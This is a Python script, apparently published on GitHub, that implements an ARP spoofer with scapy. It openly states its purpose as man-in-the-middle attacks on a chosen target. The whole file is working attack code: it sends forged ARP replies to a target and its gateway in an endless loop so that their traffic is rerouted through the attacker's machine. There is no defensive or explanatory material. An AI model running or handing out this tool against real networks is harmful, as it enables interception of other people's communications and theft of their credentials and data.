#!/usr/local/bin/python
#-*- coding:utf-8 -*-

VERSION: str = '1.0'
"""
ARP Spoofer - A simple ARP Spoofer to performed MITM Attacks against a specific targed
Copyright © 2024 Daniel Hoffman (Aka. Z)
GitHub: Zeta-0x00

@Author Daniel Hofman (Aka. Z)
@License: GPL v3
@version {}
""".format(VERSION)

#region imports
import logging
logging.getLogger(name="scapy.runtime").setLevel(level=logging.ERROR)
from termcolor import colored
import scapy.all as scapy # type: ignore
from types import FrameType
import time
import argparse
import signal
import sys
#endregion

#region signals
signal.signal(signalnum=signal.SIGINT, handler=lambda sig, frame: (print(f"\n{colored('[X]', 'red')} Keyboard Interrupt detected. \n\t{colored('Exiting...', 'red')}"), sys.exit(0)))
#endregion


def get_arguments() -> argparse.Namespace:
	"""Get the arguments from the user
    Returns:
        str: The target IP
		str: The Gateway (Router IP)
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Target IP")
	parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True,  help="Gateway IP") # Router IP
	parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", required=False, help="Quiet mode")
	return parser.parse_args()

def spoof(target_ip: str, spoof_ip: str) -> None:
	"""Spoof the Target Identity to the Gateway
	Args:
		target_ip: str
		spoof_ip: str
	Returns:
		None
	"""
	packet:scapy.layers.l2.ARP = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
	scapy.send(x=packet, verbose=False)

def print_banner(quiet_mode: bool = None) -> None:
	"""Print the banner"""
	if quiet_mode:
		print(colored("ARP Spoofer", "cyan"))
		return
	banner: str = colored("""
	██   █▄▄▄▄ █ ▄▄         ▄▄▄▄▄   █ ▄▄  ████▄ ████▄ ▄████  ▄███▄   █▄▄▄▄ 
	█ █  █  ▄▀ █   █       █     ▀▄ █   █ █   █ █   █ █▀   ▀ █▀   ▀  █  ▄▀ 
	█▄▄█ █▀▀▌  █▀▀▀      ▄  ▀▀▀▀▄   █▀▀▀  █   █ █   █ █▀▀    ██▄▄    █▀▀▌  
	█  █ █  █  █          ▀▄▄▄▄▀    █     ▀████ ▀████ █      █▄   ▄▀ █  █  
	█   █    █                    █                 █     ▀███▀     █   
	█   ▀      ▀                    ▀                 ▀             ▀    
	▀                                                                     
	""", 'red')
	print(banner)
	print(f"{colored('ARP Spoofer', 'magenta')}\n{colored('Author: Daniel Hoffman (Aka. Z)', 'magenta')}\n{colored('Version: 1.0', 'magenta')}\n{colored('Github: Zeta-0x00', 'magenta')}\n")

def main() -> None:
	"""Main function"""
	args: argparse.Namespace = get_arguments()
	print_banner(args.quiet)
	if not args.quiet:
		print(f"[{colored('!', 'yellow')}] Target:\t", colored(f"{args.target_ip}", "blue"))
		print(f"[{colored('!', 'yellow')}] Gateway:\t", colored(f"{args.gateway_ip}", "blue"))
	while True:
		spoof(target_ip=args.target_ip, spoof_ip=args.gateway_ip)
		spoof(target_ip=args.gateway_ip, spoof_ip=args.target_ip)
		time.sleep(2)

if __name__ == "__main__":
	main()